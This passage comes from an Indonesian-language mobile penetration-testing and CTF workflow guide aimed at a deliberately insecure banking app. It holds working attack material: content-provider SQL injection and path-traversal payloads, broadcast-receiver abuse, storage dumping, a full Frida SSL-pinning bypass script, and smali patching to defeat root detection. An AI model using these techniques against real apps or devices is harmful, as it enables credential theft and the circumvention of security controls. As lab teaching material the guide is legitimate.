# Layar emulator langsung menampilkan dashboard admin / flag
```

➡️ Screenshot / catat flag yang tampil di layar emulator.

Bash

```
# Screenshot otomatis dari emulator
adb exec-out screencap -p > ~/mobile_pentest/"$APP_NAME"/output/activity_bypass_$(date +%s).png
echo "[*] Screenshot saved!"
```

**OUTPUT GAGAL ❌ — Security Exception:**

text

```
java.lang.SecurityException: Permission Denial: starting Intent { cmp=com.insecure.bank/.AdminActivity }
```

➡️ Activity ada permission protectionnya. Cek manifest:

Bash

```
grep -A3 "AdminActivity" "$MANIFEST" | grep "permission"
# Jika ada android:permission="com.insecure.bank.ADMIN"
# Mungkin perlu APK patching untuk bypass → ke Fase 5
```

**OUTPUT GAGAL ❌ — Activity tidak exist:**

text

```
Error type 3
Error: Activity class {com.insecure.bank/com.insecure.bank.AdminActivity} does not exist.
```

➡️ Nama activity salah. Cek nama lengkapnya:

Bash

```
# Cek nama activity yang tersedia
cat ~/mobile_pentest/"$APP_NAME"/output/exported_components.txt
# Mungkin nama relatif: .AdminActivity → coba nama penuh
adb shell am start -n "com.insecure.bank/com.insecure.bank.ui.AdminActivity"
```

---

### Langkah 1.4 — Test Exported Content Provider (Jika Ada)

Bash

```
# Ambil authorities dari manifest
AUTHORITY=$(grep -oP 'android:authorities="\K[^"]+' "$MANIFEST" | head -1)
echo "[*] Provider Authority: $AUTHORITY"

# Test 1: Query basic
adb shell content query --uri "content://$AUTHORITY/users"
adb shell content query --uri "content://$AUTHORITY/data"
adb shell content query --uri "content://$AUTHORITY/accounts"

# Test 2: SQL Injection via --where parameter
adb shell content query \
  --uri "content://$AUTHORITY/users" \
  --where "1=1"

# Test 3: UNION-based SQL Injection
adb shell content query \
  --uri "content://$AUTHORITY/users" \
  --where "1=1) UNION SELECT 1,flag,3 FROM secret--"

# Test 4: Path Traversal (jika ada file-based provider)
adb shell content read \
  --uri "content://$AUTHORITY/../../../data/data/$PKG/shared_prefs/secret.xml"
```

**OUTPUT BERHASIL ✅ — Data terbaca:**

text

```
Row: 0 _id=1, username=admin, password=admin123, role=superadmin
```

**OUTPUT BERHASIL ✅ — SQLi berhasil:**

text

```
Row: 0 _id=1, title=flag{c0nt3nt_pr0v1d3r_sqli_pwn3d}, content=3
```

➡️ Dump semua data:

Bash

```
# Dump seluruh tabel yang mungkin ada
for table in users accounts data notes flags secret credentials; do
  echo "=== TABLE: $table ==="
  adb shell content query --uri "content://$AUTHORITY/$table" 2>/dev/null
done
```

**OUTPUT GAGAL ❌ — Unknown URI:**

text

```
java.lang.IllegalArgumentException: Unknown URI: content://com.insecure.bank.provider/users
```

➡️ Nama path salah. Coba enumerate path dari source code:

Bash

```
# Cari UriMatcher di source code
grep -rn "addURI\|UriMatcher" static/jadx_java/ | grep -v ".class"
# Output akan tunjukkan path yang terdaftar:
# addURI("com.insecure.bank.provider", "accounts", 1)
# addURI("com.insecure.bank.provider", "transactions", 2)
```

---

### Langkah 1.5 — Test Exported Broadcast Receiver (Jika Ada)

Bash

```
# Test 1: Kirim broadcast ke receiver
RECEIVER=$(grep -A2 '<receiver' "$MANIFEST" | grep 'exported="true"' -A1 | grep name | awk -F'"' '{print $2}' | head -1)

adb shell am broadcast \
  -a "com.insecure.bank.ACTION_UNLOCK" \
  -n "$PKG/$RECEIVER"

# Test 2: Dengan extra parameters
adb shell am broadcast \
  -a "com.insecure.bank.ACTION_UNLOCK" \
  -n "$PKG/.receivers.BackdoorReceiver" \
  --es "secret_code" "admin123" \
  --ez "unlock" true

# Monitor response di logcat (terminal lain)
adb logcat | grep -iE "$PKG|flag|unlock|broadcast"
```

**OUTPUT BERHASIL ✅ — Broadcast diterima:**

text

```
Broadcast completed: result=0, data="flag{br04dc4st_r3c31v3r_unlocked}"
```

---

## ═══════════════════════════════════════

## FASE 2: STATIC ANALYSIS — SOURCE CODE

## ═══════════════════════════════════════

> **Tujuan:** Hunting hardcoded secrets, credentials, flag, API endpoints, dan crypto logic. Ini sering yang paling cepat memberikan hasil di CTF.

### Langkah 2.1 — Hunting Hardcoded Secrets (Jalankan Semua Sekaligus)

Bash

```
JADX_DIR="static/jadx_java"

echo "=== [1] SEARCHING FLAG FORMAT ==="
grep -rnwi "$JADX_DIR" -e "flag{" -e "picoCTF{" -e "HTB{" -e "CTF{" 2>/dev/null | head -20

echo "=== [2] SEARCHING CREDENTIALS ==="
grep -rnwi "$JADX_DIR" \
  -e "password" -e "passwd" -e "api_key" -e "apikey" \
  -e "secret" -e "token" -e "bearer" -e "auth" \
  --include="*.java" 2>/dev/null | grep -v "^Binary" | grep -v "//" | head -30

echo "=== [3] SEARCHING API ENDPOINTS ==="
grep -rnEo "https?://[a-zA-Z0-9./?=_%-]*" "$JADX_DIR" 2>/dev/null \
  | grep -v "schemas.android.com\|w3.org\|example.com" \
  | sort -u | head -20

echo "=== [4] SEARCHING CLOUD CREDENTIALS ==="
grep -rnE "AKIA[0-9A-Z]{16}" "$JADX_DIR" 2>/dev/null    # AWS Access Key
grep -rnEi "firebaseio\.com" "$JADX_DIR" 2>/dev/null      # Firebase
grep -rnEi "googleapis\.com/key" "$JADX_DIR" 2>/dev/null  # Google API Key

echo "=== [5] SEARCHING IN STRINGS.XML ==="
find static/smali_decoded/res/ -name "strings.xml" \
  -exec grep -iE "key|token|flag|secret|auth|pass|admin" {} + 2>/dev/null

echo "=== [6] SEARCHING IN ASSETS ==="
find static/smali_decoded/assets/ -type f \
  -exec strings {} + 2>/dev/null \
  | grep -iE "flag\{|secret|password|admin|token" | head -20

echo "=== [7] SEARCHING NATIVE LIBS ==="
find static/smali_decoded/lib/ -name "*.so" \
  -exec strings {} + 2>/dev/null \
  | grep -iE "flag\{|picoCTF|secret|password" | head -20
```

**OUTPUT BERHASIL ✅ — Flag hardcoded di Java:**

text

```
=== [1] SEARCHING FLAG FORMAT ===
static/jadx_java/com/insecure/bank/util/Validator.java:
  if (userInput.equals("picoCTF{h4rdc0d3d_str1ng_1s_n0t_s3cur3}")) {
```

➡️ Flag ketemu! Catat dan submit. Tapi tetap lanjut untuk mencari lebih banyak.

**OUTPUT BERHASIL ✅ — Password di source:**

text

```
=== [2] SEARCHING CREDENTIALS ===
LoginActivity.java:45: String adminPass = "Sup3rS3cur3!";
Config.java:12: public static final String API_KEY = "AIzaSyBxxxxxxxxxxxxxxxx";
DatabaseHelper.java:23: String DB_PASS = "DbPassw0rd!";
```

➡️ Simpan semua kredensial:

Bash

```
cat > ~/mobile_pentest/"$APP_NAME"/loot/creds/hardcoded_creds.txt << 'EOF'
# Dari static analysis - $(date)
admin:Sup3rS3cur3!
API_KEY=AIzaSyBxxxxxxxxxxxxxxxx
DB_PASS=DbPassw0rd!
EOF
```

**OUTPUT BERHASIL ✅ — Firebase endpoint ketemu:**

text

```
=== [4] CLOUD CREDENTIALS ===
static/jadx_java/com/insecure/bank/api/ApiClient.java:
  String FIREBASE_URL = "https://insecure-bank-default-rtdb.firebaseio.com/";
```

➡️ Test akses Firebase tanpa auth:

Bash

```
# Test Firebase open access (sangat umum di CTF)
curl -s "https://insecure-bank-default-rtdb.firebaseio.com/.json" | python3 -m json.tool
curl -s "https://insecure-bank-default-rtdb.firebaseio.com/users.json"
curl -s "https://insecure-bank-default-rtdb.firebaseio.com/flags.json"
```

**OUTPUT TIDAK ADA ❌ — Tidak ada hardcoded secrets:**

text

```
(no output from all grep commands)
```

➡️ APK mungkin di-obfuscate. Cek:

Bash

```
# Cek apakah class name sudah di-obfuscate (ProGuard/R8)
ls static/jadx_java/
# Jika folder berisi: a/, b/, c/ → sudah obfuscated

# Jalankan JADX dengan deobfuscation
jadx -d static/jadx_deobf "$APK_FILE" --deobf --deobf-min 2

# Cari pola regex yang lebih luas
grep -rnE "[a-f0-9]{32,}" static/jadx_java/ 2>/dev/null | head -10  # MD5/SHA hash
grep -rnE "(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)" \
  static/jadx_java/ 2>/dev/null | head -10  # Base64
```

---

### Langkah 2.2 — Analisis Logika Crypto & Autentikasi

Bash

```
# Cari implementasi crypto
echo "=== CRYPTO USAGE ==="
grep -rn "AES\|DES\|RSA\|MD5\|SHA\|Base64\|cipher\|encrypt\|decrypt" \
  static/jadx_java/ --include="*.java" 2>/dev/null | head -20

# Cari logika autentikasi/verifikasi
echo "=== AUTH LOGIC ==="
grep -rn "equals\|compareTo\|verify\|validate\|authenticate\|checkPassword" \
  static/jadx_java/ --include="*.java" 2>/dev/null | grep -v "//\|import" | head -20

# Cari JWT atau token parsing
echo "=== TOKEN/JWT ==="
grep -rn "JWT\|JsonWebToken\|Bearer\|parseToken\|decodeToken" \
  static/jadx_java/ --include="*.java" 2>/dev/null | head -10
```

**OUTPUT BERHASIL ✅ — Logic flaw ditemukan:**

Java

```
// Dari AuthValidator.java
public boolean verifyPin(String inputPin) {
    String correctPin = Base64.decode("MTIzNA==");  // "1234" di-Base64
    return inputPin.equals(correctPin);
}
```

➡️ PIN adalah `1234`. Test langsung di aplikasi.

**OUTPUT BERHASIL ✅ — AES key hardcoded:**

Java

```
// Dari CryptoUtils.java
private static final String SECRET_KEY = "ThisIsA16ByteKey";
private static final String IV = "ThisIsAnIV123456";
```

➡️ Kita bisa decrypt data lokal dengan kunci ini. Lanjut ke dynamic analysis untuk tangkap encrypted data.

---

### Langkah 2.3 — Analisis Network Security Config

Bash

```
# Cari file konfigurasi network security
NETCONFIG=$(find static/smali_decoded/res/xml/ -name "network_security_config.xml" 2>/dev/null)

if [ -n "$NETCONFIG" ]; then
  echo "[+] Network Security Config ditemukan:"
  cat "$NETCONFIG"
else
  echo "[-] Tidak ada Network Security Config"
  echo "[*] Default behavior: Android 9+ → block cleartext HTTP"
  echo "[*] Cek manifest untuk android:usesCleartextTraffic"
  grep -i "cleartextTraffic\|networkSecurityConfig" static/smali_decoded/AndroidManifest.xml
fi
```

**OUTPUT BERHASIL ✅ — Config rentan (trust user certs):**

XML

```
<network-security-config>
  <base-config cleartextTrafficPermitted="true">
    <trust-anchors>
      <certificates src="system" />
      <certificates src="user" />  <!-- RENTAN: Trust Burp cert! -->
    </trust-anchors>
  </base-config>
</network-security-config>
```

➡️ **Tidak perlu SSL pinning bypass!** Langsung pasang Burp cert sebagai user cert → ke Fase 3.3.

**OUTPUT — Tidak ada user trust / hanya system:**

XML

```
<trust-anchors>
  <certificates src="system" />
  <!-- Tidak ada "user" source -->
</trust-anchors>
```

➡️ SSL Pinning kemungkinan aktif. Perlu bypass → ke **Fase 4**.

---

## ═══════════════════════════════════════

## FASE 3: DYNAMIC ANALYSIS

## ═══════════════════════════════════════

> **Tujuan:** Jalankan APK dan observasi perilaku runtime: log output, storage lokal, dan network traffic.

### Langkah 3.1 — Install & Monitor Logcat

Bash

```
# Terminal 1: Install APK
adb install -r "$APK_FILE"
```

**OUTPUT BERHASIL ✅:**

text

```
Performing Streamed Install
Success
```

**OUTPUT GAGAL ❌ — INSTALL_FAILED_UPDATE_INCOMPATIBLE:**

text

```
Failure [INSTALL_FAILED_UPDATE_INCOMPATIBLE]
```

➡️ Versi lama sudah terinstall dengan signature berbeda:

Bash

```
adb uninstall "$PKG"
adb install -r "$APK_FILE"
```

**OUTPUT GAGAL ❌ — INSTALL_FAILED_VERIFICATION_FAILURE:**

text

```
Failure [INSTALL_FAILED_VERIFICATION_FAILURE]
```

➡️ Google Play Protect memblokir APK yang dimodifikasi:

Bash

```
adb shell settings put global package_verifier_enable 0
adb install -r "$APK_FILE"
```

Bash

```
# Terminal 2: Monitor logcat real-time SEBELUM buka aplikasi
adb logcat -c  # Clear buffer
adb logcat | grep -iE "$PKG|flag|key|secret|token|crypto|password|pin" --line-buffered

# Terminal 3: Buka aplikasi (sambil lihat logcat)
adb shell am start -n "$PKG/$MAIN_ACTIVITY"
# Interaksi dengan app: login, klik tombol, isi form, dll.
```

**OUTPUT BERHASIL ✅ — Flag bocor ke logcat:**

text

```
D/InsecureBank: User logged in: admin
D/FlagManager: Generated flag: flag{l0gc4t_l3ak_found}
I/DEBUG: Decrypted data: HTB{s3cr3t_fr0m_l0gc4t}
```

➡️ Flag atau credentials bocor ke log! Simpan:

Bash

```
adb logcat -d | grep -iE "flag|secret|token" > ~/mobile_pentest/"$APP_NAME"/loot/logcat_dump.txt
```

---

### Langkah 3.2 — Analisis Local Storage

Bash

```
# Pastikan ADB root aktif
adb root
adb shell "id"
# Harus: uid=0(root)

# Cek isi direktori data aplikasi
adb shell "ls -la /data/data/$PKG/"
```

**OUTPUT BERHASIL ✅:**

text

```
drwxrwx--x databases
drwxrwx--x shared_prefs
drwxr-x--x files
drwxr-x--x cache
```

Bash

```
# 1. Dump SharedPreferences (token, PIN, flag sering tersimpan di sini)
echo "=== SHARED PREFERENCES ==="
adb shell "ls /data/data/$PKG/shared_prefs/" 2>/dev/null
adb shell "cat /data/data/$PKG/shared_prefs/*.xml" 2>/dev/null

# 2. Pull dan analisis database SQLite
echo "=== DATABASES ==="
adb shell "ls /data/data/$PKG/databases/" 2>/dev/null
adb pull "/data/data/$PKG/databases/" ~/mobile_pentest/"$APP_NAME"/loot/db/ 2>/dev/null

# Analisis database yang di-pull
for db in ~/mobile_pentest/"$APP_NAME"/loot/db/*.db; do
  echo "--- DB: $db ---"
  sqlite3 "$db" ".tables"
  sqlite3 "$db" ".dump" 2>/dev/null | grep -iE "flag|secret|admin|password" | head -10
done

# 3. Cek files directory
adb shell "find /data/data/$PKG/files/ -type f 2>/dev/null"
adb pull "/data/data/$PKG/files/" ~/mobile_pentest/"$APP_NAME"/loot/ 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Flag di SharedPreferences:**

XML

```
<map>
  <string name="flag">flag{sh4r3d_pr3fs_4r3_just_pl41n_xml}</string>
  <string name="user_token">eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ...</string>
</map>
```

**OUTPUT BERHASIL ✅ — Data sensitif di SQLite:**

SQL

```
--- DB: insecure_bank.db ---
users|accounts|transactions|secret_flags
-- Dari .dump:
INSERT INTO secret_flags VALUES(1,'flag{sqlit3_st0r4g3_unencrypt3d}');
INSERT INTO users VALUES(1,'admin','password123','admin');
```

➡️ Simpan semua findings:

Bash

```
adb shell "cat /data/data/$PKG/shared_prefs/*.xml" \
  > ~/mobile_pentest/"$APP_NAME"/loot/creds/shared_prefs_dump.txt
sqlite3 ~/mobile_pentest/"$APP_NAME"/loot/db/*.db ".dump" \
  > ~/mobile_pentest/"$APP_NAME"/loot/db/full_db_dump.txt 2>/dev/null
```

**OUTPUT GAGAL ❌ — Database encrypted (SQLCipher):**

text

```
sqlite3: Error: file is not a database
```

➡️ Database menggunakan SQLCipher encryption. Perlu kunci dekripsi dari source code atau Frida:

Bash

```
# Cari SQLCipher key di source code
grep -rn "SQLiteDatabase.openOrCreateDatabase\|SQLiteOpenHelper\|passphrase\|sqlcipher" \
  static/jadx_java/ --include="*.java" 2>/dev/null

# Atau hook via Frida untuk intercept key saat runtime → ke Fase 4
```

---

### Langkah 3.3 — Setup Burp Suite Proxy & Intercept Traffic

Bash

```
# LANGKAH 1: Pastikan Burp Suite berjalan di Parrot OS
# Buka Burp → Proxy → Proxy Settings → Listener → Bind to All Interfaces:8080

# LANGKAH 2: Set proxy di emulator
# Settings → Network & Internet → WiFi → AndroidWifi → Edit
# Proxy: Manual → Host: [IP Parrot di tun0/eth0] → Port: 8080
IP_PARROT=$(ip addr show | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+' | grep -v "127.0.0.1" | head -1)
echo "[*] Set proxy di emulator ke: $IP_PARROT:8080"

# LANGKAH 3: Export dan install Burp certificate
# Dari Burp: Proxy → CA Certificate → Download DER format → cacert.der
# Konversi DER ke PEM
openssl x509 -inform DER -in cacert.der -out burp.pem

# Hitung hash (format Android)
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -n 1)
mv burp.pem "${HASH}.0"

# Push ke system cert store (perlu root di emulator)
adb root
adb remount
adb push "${HASH}.0" /system/etc/security/cacerts/
adb shell chmod 644 "/system/etc/security/cacerts/${HASH}.0"
adb reboot

# Tunggu reboot
adb wait-for-device
sleep 5
echo "[*] Burp cert installed. Test dengan buka browser di emulator."
```

**Setelah setup, buka aplikasi dan lakukan aktivitas normal (login, navigasi).**

**OUTPUT BERHASIL ✅ — Traffic muncul di Burp:**

text

```
GET /api/v1/login HTTP/1.1
Host: api.insecure-bank.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...

HTTP/1.1 200 OK
{"status":"ok","flag":"flag{4p1_tr4ff1c_int3rc3pt3d}","user_id":1}
```

➡️ Traffic berhasil diintersep! Analisis endpoint API:

Bash

```
# Catat semua endpoint yang ditemukan
# Test modifikasi parameter:
# - Ubah user_id ke user lain (IDOR)
# - Ganti token
# - Inject SQL di parameter
# → Lanjut ke <a href="/docs/api-security" class="text-[#00b4d8] hover:underline font-mono font-semibold">30_api_security_workflow.md</a> untuk full API testing
```

**OUTPUT GAGAL ❌ — Traffic tidak muncul (SSL Pinning):**

text

```
# Burp menunjukkan: SSL handshake failed / Connection closed
# Emulator menunjukkan: Network error / SSL Error
```

➡️ SSL Pinning aktif. Ke **Fase 4 — SSL Pinning Bypass**.

---

## ═══════════════════════════════════════

## FASE 4: SSL PINNING BYPASS

## ═══════════════════════════════════════

> **Prasyarat:** Traffic HTTPS tidak muncul di Burp. Lanjutkan dari Fase 3.3.

### Langkah 4.1 — Identifikasi Tipe SSL Pinning

Bash

```
# Cari library pinning di source code
echo "=== SSL PINNING DETECTION ==="
grep -rn "CertificatePinner\|checkServerTrusted\|TrustManager\|PinSet\|ssl_pins" \
  static/jadx_java/ --include="*.java" 2>/dev/null | head -15

# Identifikasi framework yang digunakan
grep -rn "import okhttp3\|import retrofit\|import volley\|import flutter" \
  static/jadx_java/ --include="*.java" 2>/dev/null | sort -u | head -5
```

**OUTPUT — OkHttp3 Pinning:**

Java

```
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add("api.insecure-bank.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
    .build();
```

**OUTPUT — Custom TrustManager:**

Java

```
public void checkServerTrusted(X509Certificate[] chain, String authType) {
    // Custom validation logic
}
```

**OUTPUT — Network Security Config only (dari manifest):**

text

```
# Tidak ada code pinning, hanya network_security_config.xml
```

---

### Langkah 4.2 — Bypass Method 1: Objection (Paling Cepat)

Bash

```
# LANGKAH 1: Setup Frida Server di emulator
FRIDA_VER=$(frida --version)
ABI=$(adb shell getprop ro.product.cpu.abi | tr -d '\r')
echo "[*] Frida version: $FRIDA_VER | Device ABI: $ABI"

# Download frida-server yang matching
wget "https://github.com/frida/frida/releases/download/${FRIDA_VER}/frida-server-${FRIDA_VER}-android-${ABI}.xz" \
  -O /tmp/frida-server.xz
unxz /tmp/frida-server.xz
mv /tmp/frida-server /tmp/frida-server-bin

# Push dan jalankan di emulator
adb push /tmp/frida-server-bin /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# Verifikasi Frida berjalan
sleep 2
frida-ps -U | grep -v "^PID" | head -5
```

**OUTPUT BERHASIL ✅ — Frida berjalan:**

text

```
2891  InsecureBank
3012  com.insecure.bank
```

Bash

```
# LANGKAH 2: Jalankan Objection dengan SSL bypass otomatis
objection -g "$PKG" explore --startup-command "android sslpinning disable"
```

**OUTPUT BERHASIL ✅:**

text

```
com.insecure.bank on (google: 11) [usb] #
(agent) [+] Loaded com.squareup.okhttp3.CertificatePinner, hooking..
(agent) [+] Bypass OkHttp3 CertificatePinner
(agent) [+] Loaded android.security.net.config.NetworkSecurityTrustManager, hooking..
```

➡️ Kembali ke Burp Suite → traffic sekarang harus muncul.

**OUTPUT GAGAL ❌ — Frida version mismatch:**

text

```
Failed to spawn: unable to find process with name 'com.insecure.bank'
Frida version mismatch! Client: 16.2.1, Server: 16.1.9
```

➡️ Versi tidak cocok:

Bash

```
# Download frida-server dengan versi yang SAMA persis dengan client
pip3 install frida-tools==16.2.1  # Downgrade/upgrade client
# ATAU download server yang matching dengan versi client saat ini
```

**OUTPUT GAGAL ❌ — Objection berhasil tapi traffic masih blocked:**

text

```
(agent) [+] Bypass applied but traffic still fails
```

➡️ Custom pinning implementation. Lanjut ke Method 2.

---

### Langkah 4.3 — Bypass Method 2: Custom Frida Script

Bash

```
# Buat custom bypass script
cat > ~/mobile_pentest/"$APP_NAME"/frida/ssl_bypass.js << 'FRIDA_SCRIPT'
Java.perform(function () {
    console.log("[*] Starting Universal SSL Pinning Bypass...");

    // 1. OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function (hostname, peerCertificates) {
            console.log('[+] Bypassed OkHttp3 CertificatePinner for: ' + hostname);
            return;
        };
        console.log('[+] OkHttp3 hooked');
    } catch(e) { console.log('[-] OkHttp3 not found: ' + e); }

    // 2. TrustManagerImpl
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            console.log('[+] Bypassed TrustManagerImpl for: ' + host);
            return untrustedChain;
        };
    } catch(e) { console.log('[-] TrustManagerImpl not found'); }

    // 3. Custom X509TrustManager
    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        var TrustManager = Java.registerClass({
            name: 'com.custom.bypass.TrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });
        var SSLContext_init = SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom');
        SSLContext_init.implementation = function(keyManager, trustManager, secureRandom) {
            SSLContext_init.call(this, keyManager, [TrustManager.$new()], secureRandom);
            console.log('[+] Overridden SSLContext with permissive TrustManager');
        };
    } catch(e) { console.log('[-] SSLContext override failed: ' + e); }

    console.log("[*] SSL Bypass script complete.");
});
FRIDA_SCRIPT

# Jalankan script
frida -U -f "$PKG" -l ~/mobile_pentest/"$APP_NAME"/frida/ssl_bypass.js --no-pause
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Starting Universal SSL Pinning Bypass...
[+] OkHttp3 hooked
[+] Bypassed OkHttp3 CertificatePinner for: api.insecure-bank.com
[+] Bypassed TrustManagerImpl for: api.insecure-bank.com
[*] SSL Bypass script complete.
```

**OUTPUT GAGAL ❌ — Semua bypass gagal (Flutter app):**

text

```
[-] OkHttp3 not found
[-] TrustManagerImpl not found
[-] SSLContext override failed
```

➡️ Kemungkinan Flutter app yang pakai native TLS library:

Bash

```
# Cek apakah Flutter
ls static/smali_decoded/lib/arm64-v8a/ | grep "flutter\|libapp"
# Jika ada libflutter.so → ini Flutter app

# Method 3: APK Patching Network Security Config → ke Fase 5
# Atau gunakan script Flutter-specific:
# https://github.com/NVISOsecurity/disable-flutter-tls-verification
frida -U -f "$PKG" -l disable-flutter-tls.js --no-pause
```

---

### Langkah 4.4 — Bypass Method 3: APK Patching (Jika Frida Gagal)

Bash

```
# Modifikasi Network Security Config agar trust user certs
NETCONFIG_PATH="static/smali_decoded/res/xml/network_security_config.xml"

# Jika tidak ada, buat baru
mkdir -p static/smali_decoded/res/xml/
cat > "$NETCONFIG_PATH" << 'XML'
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
</network-security-config>
XML

# Pastikan manifest mereferensikan network security config
# Di AndroidManifest.xml tambahkan di tag <application>:
# android:networkSecurityConfig="@xml/network_security_config"
grep -q "networkSecurityConfig" static/smali_decoded/AndroidManifest.xml || \
  sed -i 's/<application /\<application android:networkSecurityConfig="@xml\/network_security_config" /' \
  static/smali_decoded/AndroidManifest.xml

# Rebuild APK → ke Fase 5 untuk full patching pipeline
```

---

## ═══════════════════════════════════════

## FASE 5: APK PATCHING & REPACKAGING

## ═══════════════════════════════════════

> **Kapan masuk sini:** Ada root detection, emulator detection, SSL pinning yang tidak bisa di-bypass runtime, atau ada fitur yang perlu di-unlock secara permanen.

### Langkah 5.1 — Identifikasi Target Patching

Bash

```
# Cari implementasi pengecekan yang perlu di-bypass
echo "=== ROOT DETECTION ==="
grep -rn "isRooted\|checkRoot\|RootBeer\|su\|busybox\|Superuser\|supersu" \
  static/jadx_java/ --include="*.java" 2>/dev/null | head -10

echo "=== EMULATOR DETECTION ==="
grep -rn "isEmulator\|Build.FINGERPRINT\|Build.MODEL\|goldfish\|sdk_gphone\|generic" \
  static/jadx_java/ --include="*.java" 2>/dev/null | head -10

echo "=== INTEGRITY CHECK ==="
grep -rn "getPackageInfo\|signature\|checksum\|tamper\|integrity" \
  static/jadx_java/ --include="*.java" 2>/dev/null | head -10
```

**Jika root/emulator detection ditemukan, cari di Smali:**

Bash

```
# Cari method yang mengandung pengecekan root
grep -rn "isRooted\|checkRoot" static/smali_decoded/smali/ | head -5
# Output: smali/com/target/app/SecurityCheck.smali:45: .method public static isRooted()Z
```

---

### Langkah 5.2 — Patch Smali (Force Return False)

Bash

```
# Buka file yang perlu di-patch
TARGET_SMALI="static/smali_decoded/smali/com/insecure/bank/utils/SecurityCheck.smali"
cat "$TARGET_SMALI" | grep -A20 "isRooted\|checkRoot" | head -25
```

**Smali SEBELUM patch:**

smali

```
.method public static isRooted()Z
    .registers 2
    
    invoke-static {}, Lcom/insecure/bank/utils/RootUtils;->checkBuildTags()Z
    move-result v0
    if-eqz v0, :cond_exit
    const/4 v1, 0x1
    return v1
    
    :cond_exit
    const/4 v1, 0x0
    return v1
.end method
```

Bash

```
# Edit file smali (hapus semua logic, langsung return false)
# Buka dengan editor:
nano "$TARGET_SMALI"
```

**Smali SETELAH patch (ganti isi method):**

smali

```
.method public static isRooted()Z
    .registers 2
    
    # PATCHED: Always return false (not rooted)
    const/4 v0, 0x0
    return v0
.end method
```

---

### Langkah 5.3 — Rebuild, Sign & Install

Bash

```
# STEP 1: Rebuild APK dari Smali yang sudah di-patch
cd ~/mobile_pentest/"$APP_NAME"/
apktool b static/smali_decoded -o patched_unsigned.apk

# Cek output
ls -la patched_unsigned.apk
```

**OUTPUT BERHASIL ✅:**

text

```
I: Using Apktool 2.7.0
I: Checking whether sources has changed...
I: Building smali source files...
I: Building resources...
I: Built apk into: patched_unsigned.apk
```

**OUTPUT GAGAL ❌ — Build error:**

text

```
brut.androlib.AndrolibException: Could not exec (exit code = 1)
```

➡️ Ada syntax error di Smali:

Bash

```
# Cek error detail
apktool b static/smali_decoded -o patched_unsigned.apk 2>&1 | grep "ERROR\|error"
# Perbaiki syntax error di file Smali yang diedit
# Pastikan tidak ada register yang salah, label yang hilang, dll
```

Bash

```
# STEP 2: Generate debug keystore (sekali saja)
if [ ! -f ~/debug.keystore ]; then
    keytool -genkey -v \
      -keystore ~/debug.keystore \
      -alias androiddebugkey \
      -keyalg RSA -keysize 2048 -validity 10000 \
      -storepass android -keypass android \
      -dname "CN=Android Debug,O=Android,C=US"
    echo "[+] Debug keystore created"
fi

# STEP 3: Zipalign (WAJIB sebelum sign dengan apksigner)
zipalign -v -f 4 patched_unsigned.apk patched_aligned.apk

# STEP 4: Sign dengan apksigner (mendukung v1/v2/v3)
apksigner sign \
  --ks ~/debug.keystore \
  --ks-pass pass:android \
  --key-pass pass:android \
  --out patched_final.apk \
  patched_aligned.apk

# Verifikasi signature
apksigner verify --verbose patched_final.apk | head -5

# STEP 5: Install ke emulator
adb uninstall "$PKG" 2>/dev/null
adb install patched_final.apk
```

**OUTPUT BERHASIL ✅:**

text

```
Verifies
Verified using v1 scheme (JAR signing): true
Verified using v2 scheme (APK Signature Scheme v2): true

Performing Streamed Install
Success
```

---

## ═══════════════════════════════════════

## FASE 6: FRIDA SCRIPTING (ADVANCED)

## ═══════════════════════════════════════

> **Kapan masuk sini:** Butuh intercept logika runtime, dump decrypted data, hook crypto functions, atau bypass validasi yang kompleks.

### Langkah 6.1 — Hook Authentication Logic

Bash

```
# Buat script hook authentication
cat > ~/mobile_pentest/"$APP_NAME"/frida/hook_auth.js << 'FRIDA'
Java.perform(function () {
    console.log("[*] Auth hook script loaded");
    
    // Enumerate semua class yang loaded (untuk discovery)
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            if (className.includes("auth") || className.includes("Auth") ||
                className.includes("login") || className.includes("Login") ||
                className.includes("verify") || className.includes("Verify")) {
                console.log("[Class Found] " + className);
            }
        },
        onComplete: function() { console.log("[*] Class enumeration done"); }
    });
});
FRIDA

# Jalankan untuk discovery dulu
frida -U -f "$PKG" -l ~/mobile_pentest/"$APP_NAME"/frida/hook_auth.js --no-pause 2>/dev/null | head -30
```

**OUTPUT BERHASIL ✅ — Class terdeteksi:**

text

```
[Class Found] com.insecure.bank.util.AuthValidator
[Class Found] com.insecure.bank.LoginActivity
[Class Found] com.insecure.bank.api.AuthService
```

Bash

```
# Setelah tahu class name, buat hook spesifik
cat > ~/mobile_pentest/"$APP_NAME"/frida/hook_specific.js << 'FRIDA'
Java.perform(function () {
    
    // Hook password validation
    var AuthValidator = Java.use("com.insecure.bank.util.AuthValidator");
    
    AuthValidator.verifyPassword.implementation = function(inputPassword) {
        console.log("\n[!] verifyPassword() called!");
        console.log("[+] Input password: " + inputPassword);
        
        var originalResult = this.verifyPassword(inputPassword);
        console.log("[+] Original return: " + originalResult);
